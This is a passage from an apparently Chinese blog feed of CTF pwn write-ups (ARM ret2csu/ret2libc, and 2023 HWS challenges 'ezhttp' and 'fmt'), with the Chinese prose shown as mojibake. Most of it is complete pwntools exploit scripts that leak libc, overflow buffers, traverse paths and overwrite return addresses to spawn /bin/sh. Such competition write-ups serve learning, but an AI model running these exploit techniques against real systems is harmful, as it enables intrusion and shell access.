__libc_csu_init+<span class="number">50</span>â†“j</span><br><span class="line">.text:<span class="number">000104E0</span> <span class="number">09</span> <span class="number">20</span> A0 E1                 MOV     R2, R9</span><br><span class="line">.text:<span class="number">000104E4</span> <span class="number">08</span> <span class="number">10</span> A0 E1                 MOV     R1, R8</span><br><span class="line">.text:<span class="number">000104E8</span> <span class="number">07</span> <span class="number">00</span> A0 E1                 MOV     R0, R7</span><br><span class="line">.text:<span class="number">000104</span>EC <span class="number">04</span> <span class="number">30</span> <span class="number">95</span> E4                 LDR     R3, [R5],#<span class="number">4</span>     ; r5 gotè¡¨</span><br><span class="line">.text:<span class="number">000104F</span>0 <span class="number">01</span> <span class="number">40</span> <span class="number">84</span> E2                 ADD     R4, R4, #<span class="number">1</span></span><br><span class="line">.text:<span class="number">000104F</span>4 <span class="number">33</span> FF <span class="number">2F</span> E1                 BLX     R3</span><br><span class="line">.text:<span class="number">000104F</span>8 <span class="number">04</span> <span class="number">00</span> <span class="number">56</span> E1                 CMP     R6, R4</span><br><span class="line">.text:<span class="number">000104F</span>C F7 FF FF <span class="number">1</span>A                 BNE     loc_104E0</span><br><span class="line">.text:<span class="number">00010500</span> F0 <span class="number">87</span> BD E8                 POP     &#123;R4-R10,PC&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è£…ä¸ªå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">ret2csu</span><span class="params">(padding,pop_r4_r10_ad,mov_r2_r9_ad,call_func_got_R5,arg0_R7,arg1_R8,arg2_R9,ret_ad)</span>:</span><br><span class="line">  &#x27;&#x27;&#x27;</span><br><span class="line">  pop_r4_r10_ad: csué‡Œ POP     &#123;R4-R10,PC&#125;åœ°å€</span><br><span class="line">  mov_r2_r9_ad: csué‡ŒMOV     R2, R9åœ°å€</span><br><span class="line">  call_func_got_R5: å­˜æœ‰è¦æ‰§è¡Œå‡½æ•°åœ°å€çš„åœ°å€ ä¸€èˆ¬ä¸ºgot</span><br><span class="line">  arg0_R7:å‚æ•°<span class="number">1</span></span><br><span class="line">  arg1_R8:å‚æ•°<span class="number">2</span></span><br><span class="line">  arg2_R9:å‚æ•°<span class="number">3</span></span><br><span class="line">  ret_ad:æ‰§è¡Œè¿‡åè¿”å›çš„åœ°å€</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  R4=<span class="number">1</span></span><br><span class="line">  R6=<span class="number">2</span></span><br><span class="line">  R10=<span class="number">0xdeadbeef</span></span><br><span class="line">  payload=padding+p32(pop_r4_r10_ad)+p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(mov_r2_r9_ad)</span><br><span class="line">  payload+=p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(ret_ad)</span><br><span class="line">  sl(payload)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./ret2libc_arm&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io = process(pwnfile)</span></span><br><span class="line">    io = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,pwnfile])</span><br><span class="line">    <span class="meta">#io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./ret2libc_arm&quot;</span>])</span></span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">def ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,call_func_got_R5,arg0_R7,arg1_R8,arg2_R9,ret_ad):</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  pop_r4_r10_ad: csué‡Œ POP     &#123;R4-R10,PC&#125;åœ°å€</span><br><span class="line">  mov_r2_r9_ad: csué‡ŒMOV     R2, R9åœ°å€</span><br><span class="line">  call_func_got_R5: å­˜æœ‰è¦æ‰§è¡Œå‡½æ•°åœ°å€çš„åœ°å€ ä¸€èˆ¬ä¸ºgot</span><br><span class="line">  arg0_R7:å‚æ•°<span class="number">1</span></span><br><span class="line">  arg1_R8:å‚æ•°<span class="number">2</span></span><br><span class="line">  arg2_R9:å‚æ•°<span class="number">3</span></span><br><span class="line">  ret_ad:æ‰§è¡Œè¿‡åè¿”å›çš„åœ°å€</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  R4=<span class="number">1</span></span><br><span class="line">  R6=<span class="number">2</span></span><br><span class="line">  R10=<span class="number">0xdeadbeef</span></span><br><span class="line">  payload=padding+p32(pop_r4_r10_ad)+p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(mov_r2_r9_ad)</span><br><span class="line">  payload+=p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(ret_ad)</span><br><span class="line">  ru(b<span class="string">&quot;put:&quot;</span>)</span><br><span class="line">  sl(payload)</span><br><span class="line">padding=<span class="number">12</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span></span><br><span class="line">pop_r4_r10_ad=<span class="number">0x0010500</span></span><br><span class="line">mov_r2_r9_ad=<span class="number">0x00104E0</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_ad=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,write_got,<span class="number">1</span>,write_got,<span class="number">0x10</span>,main_ad)</span><br><span class="line">ru(b<span class="number">&#x27;b</span>yebye<span class="number">&#x27;</span>)</span><br><span class="line">write_ad=uu32(r(<span class="number">4</span>))</span><br><span class="line">base=write_ad-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = base + next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line">bss=elf.bss()+<span class="number">0x100</span></span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,read_got,<span class="number">0</span>,bss,<span class="number">0x8</span>,main_ad)</span><br><span class="line">sl(p32(system_addr))</span><br><span class="line">ret2csu(padding,pop_r4_r10_ad,mov_r2_r9_ad,bss,binsh,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xdeadbeff</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 HWS pwn</title>
      <link href="/2023/07/17/2023hws/"/>
      <url>/2023/07/17/2023hws/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1tXE2hCnld4tdbytiQtSvog">https://pan.baidu.com/s/1tXE2hCnld4tdbytiQtSvog</a><br>æå–ç ï¼šllaa</p><h1 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-918h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-914h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+20h] [rbp-910h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 get_data_number; <span class="comment">// [rsp+28h] [rbp-908h]</span></span><br><span class="line">  __int64 j; <span class="comment">// [rsp+28h] [rbp-908h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-900h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+30h] [rbp-900h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8F8h]</span></span><br><span class="line">  <span class="type">char</span> *k; <span class="comment">// [rsp+40h] [rbp-8F0h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+50h] [rbp-8E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">64</span>]; <span class="comment">// [rsp+E0h] [rbp-850h] BYREF</span></span><br><span class="line">  <span class="type">char</span> haystack[<span class="number">256</span>]; <span class="comment">// [rsp+120h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">char</span> request_mode[<span class="number">256</span>]; <span class="comment">// [rsp+220h] [rbp-710h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [rsp+320h] [rbp-610h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">16</span>]; <span class="comment">// [rsp+520h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">5</span>]; <span class="comment">// [rsp+530h] [rbp-400h] BYREF</span></span><br><span class="line">  _BYTE v18[<span class="number">1011</span>]; <span class="comment">// [rsp+535h] [rbp-3FBh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+928h] [rbp-8h]</span></span><br></pre></td></tr></table></figure><p>åˆ†æè¿‡åè¦æ§åˆ¶ sub_5596534A9993(a1, s, request_mode, k, v4);å‡½æ•°é‡Œçš„execl(a2, 0LL);æ¥æ‰§è¡Œbin&#x2F;sh</p><p>haystackå’Œhtdocsæ‹¼æ¥ç»„æˆa2 htdocsä¸€èˆ¬åœ¨Opt&#x2F;lampp&#x2F;htdocsä¸‹æ‰€ä»¥éœ€è¦æ§åˆ¶haystackä¸ºhtdocs&#x2F;..&#x2F;..&#x2F;..&#x2F;bin&#x2F;shï¼Œä½†æ˜¯åˆè¿‡æ»¤strstr(haystack, â€œ..â€)ä¸èƒ½ç›´æ¥..&#x2F; ï¼Œget_data_number &#x3D; get_data(a1, input, 1024)é‚£é‡Œå¯ä»¥æº¢å‡ºæ§åˆ¶v18ç„¶åï¼Œåˆ©ç”¨sub_5596534A8766(v18, v12);å†åˆ©ç”¨v12å‘haystacké‡Œå†™æ•°å€¼ï¼Œsub_5596534A8766é‡Œå››ä¸ªv18å¤„çš„å€¼å¯ä»¥æ§åˆ¶ä¸‰ä¸ªv12å¤„çš„å€¼ï¼Œæ‰€ä»¥ä¼šä»v12+63å°±éœ€è¦æ¥æ§åˆ¶å€¼æ¥è¾“å‡ºåˆ°haystackï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªé‡‡ç”¨äº†&#x2F;&#x2F;.çš„æ–¹å¼æ¥å†™ä¸ºLy8uï¼Œåé¢é‡‡ç”¨&#x2F;..çš„æ–¹å¼å†™Ly4uï¼Œç„¶åæœ€åç”¨L&#x3D;&#x3D;&#x3D;åªå†™ä¸€ä¸ª&#x2F;ï¼Œç”¨ç­‰å·æ¥æ§åˆ¶ç»“æŸï¼Œæœ€ç»ˆå°±æ˜¯htdocs&#x2F;.&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;bin&#x2F;sh,å…¶ä½™åˆ¤æ–­å¸¸è§„ç»•è¿‡å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_5596534A8766</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 j; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 k; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 m; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 s; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+25h] [rbp-Bh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+26h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+27h] [rbp-9h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">                                                <span class="comment">// a1å¯æ§  a2+64å†™</span></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(v10 + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">255</span>, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x3F</span>u; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[j] == *(v10 + a1) )</span><br><span class="line">        s = j;                                  <span class="comment">// 11 L</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">0x3F</span>u; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[k] == *(v10 + <span class="number">1LL</span> + a1) )</span><br><span class="line">        v13 = k;                                <span class="comment">// 50 y</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">0x3F</span>u; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[m] == *(v10 + <span class="number">2LL</span> + a1) )</span><br><span class="line">        v14 = m;                                <span class="comment">// 56 4</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">0x3F</span>u; ++n )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( off_5596534AD010[n] == *(v10 + <span class="number">3LL</span> + a1) )</span><br><span class="line">        v15 = n;                                <span class="comment">// 46 u</span></span><br><span class="line">    &#125;</span><br><span class="line">    v2 = i++;</span><br><span class="line">    *(v2 + a2) = (v13 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span> | (<span class="number">4</span> * s);      <span class="comment">// v13=50 s=11 /</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v10 + <span class="number">2LL</span> + a1) == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = i++;</span><br><span class="line">    *(v3 + a2) = (v14 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span> | (<span class="number">16</span> * v13); <span class="comment">// v14=56 111000 .  60 /</span></span><br><span class="line">    <span class="keyword">if</span> ( *(v10 + <span class="number">3LL</span> + a1) == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = i;</span><br><span class="line">    *(v4 + a2) = v15 &amp; <span class="number">63</span> | (v14 &lt;&lt; <span class="number">6</span>);         <span class="comment">// v15 46 .   v14æœ€åä¸¤ä½å¿…é¡»æ˜¯00</span></span><br><span class="line">    v10 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;60.204.140.184&quot;</span>,<span class="string">&quot;30230&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">get abcabcabcabc/bin/sh?.css.html</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbLy8uLy4uLy4uLy4uL===</span><br><span class="line">Authorization: Basic</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>get abcabcabcabc/bin/bash?.css.html<span class="number">&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">21</span>+b<span class="number">&#x27;b</span><span class="number">&#x27;</span>*<span class="number">84</span>+b<span class="number">&#x27;L</span>y8uLy4uLy4uLy4uL===&#x27;</span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(b<span class="number">&#x27;</span>Authorization: Basic <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sleep(1)</span></span><br><span class="line"><span class="string">io.send(b&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>èµ›åçœ‹äº†wpå‘ç°sub_5596534A8766æ˜¯ä¸€ä¸ªbase64çš„è§£å¯†ï¼Œç›´æ¥æ„é€ è¦†å†™å°±è¡Œäº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">b<span class="number">&#x27;</span>Authorization: Basic <span class="string">&#x27;+base64.b64encode(64*b&#x27;</span>a<span class="number">&#x27;</span>+b<span class="number">&#x27;</span>/../../../../../../../../bin/sh?.html<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h1><p>å¸¸è§„æ ˆä¸Šå­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´ï¼Œæ³„éœ²mainå‡½æ•°è¿”å›åœ°å€æ‰€åœ¨çš„æ ˆåœ°å€å’ŒlibcåŸºå€ï¼Œç„¶åé•¿åº¦ä¸å¤Ÿæ‰€ä»¥ä¸€æ¬¡å†™ä¸¤ä¸ªå­—èŠ‚å†™onegadgetåˆ°è¿”å›åœ°å€å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;60.204.140.184&#x27;</span>,<span class="string">&#x27;30058&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x00136D)&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x013E8  )&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%18$p%21$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;a str: &quot;</span>,payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_tar=<span class="built_in">int</span>(ru(<span class="string">b&#x27;0x&#x27;</span>),<span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">p(<span class="string">&#x27;stack_tar&#x27;</span>,stack_tar)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line">p(<span class="string">&quot;__libc_start_main&quot;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=base+<span class="number">0xe3b01</span></span><br><span class="line"><span class="comment"># payload=fmtstr_payload(6,&#123;stack_tar:(ogg&amp;0xffffffffff)&#125;,write_size=&#x27;short&#x27;)</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;stack_tar:(ogg)&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">sla(<span class="string">b&quot;str: &quot;</span>,payload)</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"><span class="comment"># print(hex(ogg))</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h1><p><a href="https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/">https://lyoungjoo.github.io/2019/09/04/2019-TokyoWesterns-CTF-mi-write-up/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-rpath <span class="string">&#x27;/home/grxer/Desktop/share/2023hws/mi&#x27;</span> ./pwn </span><br></pre></td></tr></table></figure><p>ä¸Šé¢å‘½ä»¤å¯ä»¥æˆåŠŸpatchçš„åŸå› åº”è¯¥æ˜¯å¯¹æ–¹ç¼–è¯‘æ—¶çš„æœºå™¨æ˜¯Ubuntu20ï¼Œæˆ‘è‡ªå·±çš„ä¹Ÿæ˜¯u20</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 